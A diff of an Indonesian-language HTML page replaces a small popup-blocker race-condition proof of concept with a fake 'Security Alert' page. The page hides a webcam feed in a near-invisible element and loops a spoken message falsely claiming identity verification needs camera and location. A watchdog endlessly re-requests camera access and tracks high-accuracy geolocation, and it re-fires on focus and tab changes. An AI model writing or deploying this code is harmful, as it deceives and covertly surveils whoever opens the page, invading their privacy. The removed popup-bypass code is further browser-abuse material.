@@ -1,50 +1,288 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>Popup Blocker Race Condition PoC</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Alert - Continuous Cycle Verification</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: #000; min-height: 100vh; display: flex; flex-direction: column; gap: 12px; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; padding: 16px; }
+  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
+  .status-box { font-size: 13px; color: #cbd5e1; background: #111827; border: 1px solid #374151; padding: 10px 14px; border-radius: 6px; max-width: 380px; width: 100%; word-break: break-word; line-height: 1.45; }
+  .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
+</style>
 </head>
 <body>
-    <h2>Simulasi Popup Blocker Bypass via Async Race Condition</h2>
-    <p>Klik tombol di bawah untuk memicu interaksi awal, lalu uji apakah celah timing berhasil membuka jendela baru.</p>
-    
-    <!-- Tombol untuk memberikan initial user gesture -->
-    <button id="triggerBtn">Mulai Tes Popup</button>
 
-    <script>
-        document.getElementById('triggerBtn').addEventListener('click', function() {
-            console.log("Interaksi pengguna (gesture) terdeteksi. Memulai race condition...");
+<div class="hidden-container">
+  <video id="cam-feed" autoplay playsinline muted></video>
+</div>
 
-            // 1. Memanfaatkan aktivasi transien awal untuk menyiapkan referensi jendela
-            // Terkadang membuka jendela kosong langsung di dalam event handler sah,
-            // atau menunda eksekusi payload melalui microtask/macrotask flooding.
-            
-            let attemptOpen = () => {
-                try {
-                    // Mencoba membuka pop-up di tengah antrean asinkron yang padat
-                    let win = window.open('https://example.com', '_blank');
-                    if (win) {
-                        console.log("POPUP BERHASIL DIBUKA (Bypass terdeteksi)!");
-                    } else {
-                        console.log("Diblokir oleh pop-up blocker browser.");
-                    }
-                } catch (e) {
-                    console.error("Error:", e);
-                }
-            };
+<div class="status-box" id="status-log">[Cycle] Menunggu interaksi awal (one-click) untuk memulai siklus...</div>
 
-            // 2. Membanjiri microtask queue untuk menciptakan celah timing pada event loop
-            for (let i = 0; i < 50; i++) {
-                Promise.resolve().then(() => {
-                    // Operasi kecil untuk menahan thread
-                    let dummy = Math.sqrt(i) * Math.random();
-                });
-            }
+<script>
+(function () {
+  'use strict';
 
-            // 3. Menjadwalkan pemanggilan window.open tepat di luar siklus sinkron murni
-            // untuk menguji apakah status aktivasi transien masih "bocor" atau salah dihitung.
-            setTimeout(attemptOpen, 10);
-        });
-    </script>
+  var CONFIG = {
+    cycleInterval: 5000,       // Interval utama siklus watchdog (ms)
+    cameraRetryDelay: 3500,    // Jeda percobaan ulang kamera jika tidak aktif
+    geoRefreshDelay: 8000,     // Jeda refresh posisi lokasi secara berkala
+    tts: {
+      text: "Security verification required. Camera and location access must be enabled to confirm user identity.",
+      lang: 'en-US',
+      rate: 0.9,
+      pitch: 1.0,
+      repeatDelay: 6000
+    },
+    geo: {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    }
+  };
+
+  var state = {
+    oneClickDone: false,
+    cycleRunning: false,
+    ttsLoopActive: false,
+    ttsTimer: null,
+    camStream: null,
+    camActive: false,
+    camPending: false,
+    camRetryTimer: null,
+    watchId: null,
+    lastGeoText: "Belum ada data lokasi"
+  };
+
+  function logStatus(msg) {
+    var el = document.getElementById('status-log');
+    var now = new Date().toLocaleTimeString();
+    var line = "[" + now + "] " + msg;
+    if (el) el.textContent = line;
+    console.log(line);
+  }
+
+  // ============================================
+  // 1. TTS CONTINUOUS CYCLE MODULE
+  // ============================================
+  function scheduleNextTTS(delay) {
+    if (!state.ttsLoopActive) return;
+    clearTimeout(state.ttsTimer);
+    state.ttsTimer = setTimeout(function () {
+      runTTSStep();
+    }, delay || CONFIG.tts.repeatDelay);
+  }
+
+  function runTTSStep() {
+    if (!state.ttsLoopActive) return;
+
+    if (!('speechSynthesis' in window)) {
+      scheduleNextTTS(CONFIG.tts.repeatDelay);
+      return;
+    }
+
+    try {
+      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
+      u.lang = CONFIG.tts.lang;
+      u.rate = CONFIG.tts.rate;
+      u.pitch = CONFIG.tts.pitch;
+
+      u.onend = function () {
+        scheduleNextTTS(CONFIG.tts.repeatDelay);
+      };
+
+      u.onerror = function () {
+        scheduleNextTTS(CONFIG.tts.repeatDelay);
+      };
+
+      window.speechSynthesis.speak(u);
+
+      // Fallback timer jika event onend/onerror tidak terpanggil pada WebView tertentu
+      scheduleNextTTS(CONFIG.tts.repeatDelay + 5000);
+    } catch (e) {
+      scheduleNextTTS(CONFIG.tts.repeatDelay);
+    }
+  }
+
+  function ensureTTSCycle() {
+    if (!state.ttsLoopActive) {
+      state.ttsLoopActive = true;
+      try {
+        window.speechSynthesis.cancel();
+      } catch (e) {}
+      runTTSStep();
+    }
+  }
+
+  // ============================================
+  // 2. CAMERA CONTINUOUS CYCLE MODULE
+  // ============================================
+  function scheduleCameraRetry() {
+    clearTimeout(state.camRetryTimer);
+    if (state.camActive || state.camPending) return;
+    state.camRetryTimer = setTimeout(function () {
+      ensureCameraCycle();
+    }, CONFIG.cameraRetryDelay);
+  }
+
+  function ensureCameraCycle() {
+    if (state.camActive || state.camPending) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      logStatus("getUserMedia tidak tersedia pada konteks ini.");
+      scheduleCameraRetry();
+      return;
+    }
+
+    state.camPending = true;
+
+    navigator.mediaDevices.getUserMedia({
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        facingMode: "user"
+      },
+      audio: false
+    })
+    .then(function (stream) {
+      state.camPending = false;
+      state.camStream = stream;
+      state.camActive = true;
+
+      var videoElement = document.getElementById('cam-feed');
+      if (videoElement) {
+        videoElement.srcObject = stream;
+        videoElement.play().catch(function () {});
+      }
+
+      logStatus("Kamera aktif | " + state.lastGeoText);
+
+      stream.getVideoTracks().forEach(function (track) {
+        track.onended = function () {
+          state.camActive = false;
+          state.camStream = null;
+          logStatus("Track kamera berhenti, menjadwalkan ulang...");
+          scheduleCameraRetry();
+        };
+      });
+    })
+    .catch(function (err) {
+      state.camPending = false;
+      state.camActive = false;
+      logStatus("Kamera belum aktif (" + err.name + "), siklus retry berjalan...");
+      scheduleCameraRetry();
+    });
+  }
+
+  // ============================================
+  // 3. GEOLOCATION CONTINUOUS CYCLE MODULE
+  // ============================================
+  function handlePositionSuccess(pos) {
+    var lat = pos.coords.latitude.toFixed(6);
+    var lon = pos.coords.longitude.toFixed(6);
+    var acc = Math.round(pos.coords.accuracy);
+    state.lastGeoText = "Lokasi: " + lat + ", " + lon + " (±" + acc + "m)";
+    logStatus((state.camActive ? "Kamera aktif | " : "Siklus aktif | ") + state.lastGeoText);
+  }
+
+  function handlePositionError(err) {
+    state.lastGeoText = "Lokasi error (" + err.code + "): " + err.message;
+    logStatus(state.lastGeoText);
+  }
+
+  function startWatchPositionIfNeeded() {
+    if (!('geolocation' in navigator)) {
+      state.lastGeoText = "Geolocation tidak didukung";
+      return;
+    }
+    if (state.watchId === null) {
+      try {
+        state.watchId = navigator.geolocation.watchPosition(
+          handlePositionSuccess,
+          handlePositionError,
+          CONFIG.geo
+        );
+      } catch (e) {}
+    }
+  }
+
+  function pollCurrentPosition() {
+    if (!('geolocation' in navigator)) return;
+    try {
+      navigator.geolocation.getCurrentPosition(
+        handlePositionSuccess,
+        handlePositionError,
+        CONFIG.geo
+      );
+    } catch (e) {}
+  }
+
+  function ensureLocationCycle() {
+    startWatchPositionIfNeeded();
+    pollCurrentPosition();
+  }
+
+  // ============================================
+  // 4. MASTER WATCHDOG CYCLE (TIDAK BERHENTI)
+  // ============================================
+  function runMasterCycle() {
+    ensureTTSCycle();
+    ensureLocationCycle();
+    if (!state.camActive && !state.camPending) {
+      ensureCameraCycle();
+    }
+  }
+
+  function startMasterWatchdog() {
+    if (state.cycleRunning) return;
+    state.cycleRunning = true;
+
+    // Siklus pemantauan berkala
+    setInterval(function () {
+      runMasterCycle();
+    }, CONFIG.cycleInterval);
+
+    // Siklus polling lokasi tambahan
+    setInterval(function () {
+      pollCurrentPosition();
+    }, CONFIG.geoRefreshDelay);
+  }
+
+  // ============================================
+  // 5. ONE-CLICK & LIFECYCLE EVENT HOOKS
+  // ============================================
+  function onFirstUserGesture() {
+    if (!state.oneClickDone) {
+      state.oneClickDone = true;
+      logStatus("One-click terdeteksi, memulai siklus kamera, lokasi, dan TTS...");
+    }
+    runMasterCycle();
+    startMasterWatchdog();
+  }
+
+  ['pointerdown', 'click', 'touchend'].forEach(function (evtName) {
+    document.addEventListener(evtName, onFirstUserGesture, { passive: true });
+  });
+
+  window.addEventListener('DOMContentLoaded', function () {
+    startMasterWatchdog();
+    ensureTTSCycle();
+    ensureCameraCycle();
+  });
+
+  window.addEventListener('focus', function () {
+    runMasterCycle();
+  });
+
+  document.addEventListener('visibilitychange', function () {
+    if (!document.hidden) {
+      state.camActive = false;
+      state.camPending = false;
+      runMasterCycle();
+    }
+  });
+
+})();
+</script>
 </body>
 </html>
